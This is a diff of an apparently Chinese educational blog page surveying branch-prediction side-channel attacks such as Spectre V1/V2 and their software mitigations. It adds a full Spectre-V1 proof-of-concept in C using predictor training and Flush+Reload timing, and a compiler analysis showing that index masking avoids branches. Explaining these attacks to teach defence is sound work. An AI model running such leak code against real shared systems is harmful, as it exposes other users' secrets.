@@ -431,8 +431,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%EF%BC%8C%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/">
-                                <span class="chip bg-color">侧信道，分支预测</span>
+                            <a href="/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/">
+                                <span class="chip bg-color">侧信道</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/">
+                                <span class="chip bg-color">分支预测</span>
                             </a>
                         
                     </div>
@@ -465,14 +469,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    9k
+                    10.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    35 分
+                    41 分
                 </div>
                 
 
@@ -495,7 +499,104 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="分支预测攻击及原理"><a href="#分支预测攻击及原理" class="headerlink" title="分支预测攻击及原理"></a>分支预测攻击及原理</h2><h3 id="Spectre-V2（Intel-ARM-AMD）"><a href="#Spectre-V2（Intel-ARM-AMD）" class="headerlink" title="Spectre-V2（Intel,ARM,AMD）"></a>Spectre-V2（Intel,ARM,AMD）</h3><ul>
+                <h2 id="分支预测攻击及原理"><a href="#分支预测攻击及原理" class="headerlink" title="分支预测攻击及原理"></a>分支预测攻击及原理</h2><h3 id="Spectre-V1（Intel-ARM-AMD）"><a href="#Spectre-V1（Intel-ARM-AMD）" class="headerlink" title="Spectre-V1（Intel, ARM, AMD）"></a>Spectre-V1（Intel, ARM, AMD）</h3><ul>
+<li>原理（目标微结构）<ul>
+<li>主攻分支预测器（如 BHR&#x2F;Pattern History Table），利用分支预测引起的“错误执行路径”造成敏感数据泄露。攻击者在分支预测器中训练一个条件分支，使得 CPU 在分支判断实际结果可知前，基于历史预测错误地“无条件”执行了访问敏感数据的语句，完成推测执行（执行 gadget）。</li>
+</ul>
+</li>
+<li>攻击思路要点<ul>
+<li>攻击者反复训练分支预测器，使其在特定输入下倾向于预测为“条件为真”。</li>
+<li>受害者代码包含数据越界访问（如 array[x]），且条件分支（如 x &lt; array_size）实际为假，但预测器被训练为常为真，于是 CPU 会推测执行越界语句 array[x]，将敏感数据内容泄露到微架构（常为缓存）。</li>
+<li>攻击者随后通过缓存侧信道（如 Flush+Reload）恢复秘密。</li>
+</ul>
+</li>
+<li>所需条件 &#x2F; 限制<ul>
+<li>能影响受害者共享分支预测器状态的 CPU，通常可跨线程同核链路。</li>
+<li>受害者代码需有数据越界条件分支和可利用的内存读（典型：array[x]，x 可控且越界能读到秘密）。</li>
+<li>受害者代码中的越界读结果可被映射到 cache side channel。</li>
+<li>所需数据结构<strong>PHT&#x2F;BHB</strong>。</li>
+</ul>
+</li>
+</ul>
+<p>POC举例如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ---------------------------------------------</span>
+<span class="token comment">// 小型 POC 展示：典型 Spectre-V1 攻击</span>
+<span class="token comment">// ---------------------------------------------</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CACHE_HIT_THRESHOLD</span> <span class="token expression"><span class="token number">80</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARRAY_SIZE</span> <span class="token expression"><span class="token number">16</span></span></span>
+
+<span class="token comment">// 目标秘密</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> secret <span class="token operator">=</span> <span class="token char">'S'</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> public_array<span class="token punctuation">[</span>ARRAY_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token comment">// 可控的数据</span>
+<span class="token keyword">char</span> probe_array<span class="token punctuation">[</span><span class="token number">256</span> <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">// 侧信道探测数组</span>
+<span class="token keyword">volatile</span> <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 受害者代码：带有越界条件分支</span>
+<span class="token keyword">void</span> <span class="token function">victim_function</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 当 x 被特定训练后，预测器认为常为真，允许推测执行下面语句</span>
+        temp <span class="token operator">&amp;=</span> probe_array<span class="token punctuation">[</span>public_array<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> score<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i<span class="token punctuation">,</span> tries<span class="token punctuation">,</span> mix_i<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> training_x<span class="token punctuation">,</span> malicious_x<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> junk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  
+    malicious_x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secret <span class="token operator">-</span> public_array<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 计算越界偏移</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>probe_array<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> probe_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 攻击循环</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>tries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> tries <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> tries<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 1. Flush probe_array</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>probe_array<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  
+        <span class="token comment">// 2. 分支预测器训练（内循环前 N-1 次，x 为合法，最后1次为恶意越界）</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            training_x <span class="token operator">=</span> j <span class="token operator">%</span> ARRAY_SIZE<span class="token punctuation">;</span>
+            <span class="token class-name">size_t</span> x<span class="token punctuation">;</span>
+            <span class="token comment">// 最后一次为越界恶意访问</span>
+            x <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> malicious_x <span class="token operator">:</span> training_x<span class="token punctuation">;</span>
+            <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ARRAY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 清理 array_size，让分支需要从内存加载（制造延迟）</span>
+            <span class="token function">victim_function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 训练/攻击执行</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token comment">// 3. 测试 probe_array 命中</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            mix_i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">167</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">;</span>
+            <span class="token class-name">uint8_t</span> <span class="token operator">*</span>addr <span class="token operator">=</span> <span class="token operator">&amp;</span>probe_array<span class="token punctuation">[</span>mix_i <span class="token operator">*</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token class-name">uint64_t</span> t1 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>junk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">volatile</span> <span class="token class-name">uint8_t</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>
+            <span class="token class-name">uint64_t</span> t2 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>junk<span class="token punctuation">)</span> <span class="token operator">-</span> t1<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>t2 <span class="token operator">&lt;=</span> CACHE_HIT_THRESHOLD<span class="token punctuation">)</span> score<span class="token punctuation">[</span>mix_i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">// 4. 输出分数最高的两个字符</span>
+    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> runner_up <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> score<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> score<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            runner_up <span class="token operator">=</span> max<span class="token punctuation">;</span> max <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>runner_up <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> score<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> score<span class="token punctuation">[</span>runner_up<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            runner_up <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"推测结果: '%c' (score=%d), 次优: '%c' (score=%d)\n"</span><span class="token punctuation">,</span> 
+           <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>max<span class="token punctuation">,</span> score<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>runner_up<span class="token punctuation">,</span> score<span class="token punctuation">[</span>runner_up<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spectre V1 POC Demo starting...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Secret: %c\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="Spectre-V2（Intel-ARM-AMD）"><a href="#Spectre-V2（Intel-ARM-AMD）" class="headerlink" title="Spectre-V2（Intel,ARM,AMD）"></a>Spectre-V2（Intel,ARM,AMD）</h3><ul>
 <li>原理（目标微结构）<ul>
 <li>主攻 BTB（以及与之相关的分支目标预测逻辑）和分支历史表。通过在攻击者上下文中“训练”预测器，使得当受害者执行间接分支（indirect call&#x2F;jmp）时，预测器会预测到攻击者指定的目标地址，从而让 CPU 在受害者上下文中短暂地在该目标上进行推测执行（执行 gadget）。</li>
 </ul>
@@ -510,6 +611,7 @@
 <li>能在与受害者共享相同分支预测状态的 CPU 执行训练（通常需在同一物理核上）；跨核通常无效。</li>
 <li>受害者地址空间中存在可执行 gadget（共享库、系统 DLL、内核&#x2F;微码等）。</li>
 <li>受害者的间接分支位置在预测时存在延迟（足够时间执行 gadget 指令）。</li>
+<li>所需数据结构<strong>BTB</strong></li>
 </ul>
 </li>
 </ul>
@@ -648,6 +750,7 @@
 <li>同样需要在与受害者共享 RSB 的执行上下文上运行（同核、超线程或顺序执行时留下 RSB 状态）。</li>
 <li>目标 gadget 必须在受害者可执行的地址空间中。</li>
 <li>不同 CPU 对 RSB 下溢的处理不同（有的用 BTB 回退），所以攻击效果依赖于具体微架构与微码。</li>
+<li>所需数据结构<strong>RSB</strong></li>
 </ul>
 </li>
 </ul>
@@ -722,6 +825,7 @@
 <li>所需条件 &#x2F; 限制<ul>
 <li>需要能在同核上通过一系列条件分支运行来建立期望的历史位模式。</li>
 <li>成功的映射依赖于预测器如何索引历史（有的用最近若干分支的目标地址低位与方向位混合）。不同 CPU 将影响训练的复杂程度（需要逆向&#x2F;试探定位哪些位有用）。</li>
+<li>所需数据结构<strong>Global BHB</strong></li>
 </ul>
 </li>
 </ul>
@@ -787,6 +891,7 @@
 <li>所需条件 &#x2F; 限制<ul>
 <li>能在与受害者共享预测器结构的上下文观察&#x2F;测量预测器输出（通常需要同核）。</li>
 <li>需要一个精妙的 probe 流程，以便把预测行为的差异映射成可测到的现象（缓存访问、时间差、错误率等）。</li>
+<li>所需数据结构<strong>BHB&#x2F;PHT</strong></li>
 </ul>
 </li>
 </ul>
@@ -811,13 +916,13 @@
     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> aux<span class="token punctuation">;</span>
     <span class="token class-name">uint64_t</span> t0 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 固定分支，分支预测行为依赖之前的BHB历史</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 固定分支，分支预测行为依赖之前的BHB历史</span>
         <span class="token keyword">volatile</span> <span class="token class-name">uint8_t</span> x <span class="token operator">=</span> probe<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 
     <span class="token class-name">uint64_t</span> t1 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token comment">// 高延迟：预测失误（mis-predicted）；低延迟：预测准确</span>
+    <span class="token comment">// 低延迟：预测失误（mis-predicted）；高延迟：预测准确</span>
     <span class="token keyword">return</span> <span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0 <span class="token operator">&lt;</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 阈值“200”依平台可微调</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
@@ -855,6 +960,7 @@
 <li>能在同核上执行大量分支以“刷”预测器。</li>
 <li>成功依赖于预测器的容量与索引&#x2F;哈希方式；不同 CPU 需要不同规模的“填充”工作量。</li>
 <li>可能需要与 BHI&#x2F;BPI 等方法结合以实现具体的目标（例如先驱逐再注入）。</li>
+<li>所需数据结构<strong>BTB</strong></li>
 </ul>
 </li>
 </ul>
@@ -941,7 +1047,46 @@
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
-<h2 id="现有防护方法"><a href="#现有防护方法" class="headerlink" title="现有防护方法"></a>现有防护方法</h2><h3 id="Index-Masking"><a href="#Index-Masking" class="headerlink" title="Index Masking"></a>Index Masking</h3><p>简单地对索引进行掩码操作，从软件层次上强制地将索引规定在合法区间中，示例如下：</p>
+<h2 id="现有防护方法"><a href="#现有防护方法" class="headerlink" title="现有防护方法"></a>现有防护方法</h2><h3 id="前置：关于三元式与条件分支区别的探讨"><a href="#前置：关于三元式与条件分支区别的探讨" class="headerlink" title="前置：关于三元式与条件分支区别的探讨"></a>前置：关于三元式与条件分支区别的探讨</h3><p>在一般设想中， 诸如此类的三元式： <code>uint32_t mask = (idx &lt; ARRAY_SIZE) ? 0xFFFFFFFF : 0x0;</code>。通常被认定为与条件分支语句 <code>if (idx &lt; ARRAY_SIZE){}</code>有着相同的底层实现。事实上，在<strong>riscv64-linux-gnu</strong>的编译链下，若未经过优化，事实也与我们所想的一样，示例C源代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> ret<span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0x1234</span> <span class="token operator">:</span> <span class="token number">0x5678</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">int</span> <span class="token function">pro</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        ret <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span> ret <span class="token operator">=</span> <span class="token number">0x5678</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 编译器无法在编译时确认</span>
+    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token function">pro</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看到此时定义了两个函数，其内部逻辑实际一致，但分别使用了三元式和条件分支的形式来实现，对此段代码进行编译并反汇编查看具体汇编代码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">riscv64-linux-gnu-gcc hello.c <span class="token parameter variable">-o</span> Yssx_hello <span class="token parameter variable">-O3</span>
+riscv64-linux-gnu-objdump Yssx_hello <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>有汇编实现如下图</p>
+<p><img src="/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/1768897650440.png" title="初始代码汇编实现"></p>
+<p>可以看到，事实上foo与pro在底层汇编代码上的实现是一致的，都利用到了条件跳转语句。但是为什么我们后续设想的Masking方案却依然可以实现呢？难道不担心在三元式处会出现新的分支预测吗？</p>
+<p>事实上，我们可以将此处代码中的三元式替换为掩码方案中的三元式 <code>int ret= (x &gt; 10) ? 0xFFFFFFFF : 0x0;</code></p>
+<p>此时，我们再对该段代码进行汇编分析（O2与O3优化后汇编一致）</p>
+<p><img src="/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/1768897945404.png" title="掩码形式三元式"></p>
+<p>可以发现，原先的条件分支语句已经被替换为了简单的数值比较与逻辑运算（这是由于0xFFFFFFFF与0x0比较工整，可以方便的使用逻辑运算得到）</p>
+<p><img src="/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/1768898137812.png" title="O1优化"></p>
+<p>O1优化下通过取负后符号扩展，也未涉及条件分支</p>
+<p><img src="/2026/01/18/fen-zhi-yu-ce-zhi-xing-lou-dong-yuan-li-zong-shu/1768898324724.png" title="O0优化"></p>
+<p>若不开启优化，则三元式依旧会存在条件跳转指令如bge</p>
+<p><strong>综上，在开启编译器任一优化的前提下，类似 <code>int ret= (x &gt; 10) ? 0xFFFFFFFF : 0x0;</code>的 三元式均无条件分支指令，无分支预测，因此Masking方案有效</strong></p>
+<h3 id="Index-Masking"><a href="#Index-Masking" class="headerlink" title="Index Masking"></a>Index Masking</h3><p>简单地对索引进行掩码操作，从软件层次上强制地将索引规定在合法区间中，示例如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//--- 原始，易受投机越界攻击的写法 ---</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     secret <span class="token operator">=</span> array<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -1285,8 +1430,12 @@ trap_loop:                       ; [4] trap loop是保险兜底，不会被常�
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%EF%BC%8C%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/">
-                                    <span class="chip bg-color">侧信道，分支预测</span>
+                                <a href="/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/">
+                                    <span class="chip bg-color">侧信道</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/">
+                                    <span class="chip bg-color">分支预测</span>
                                 </a>
                             
                         </div>
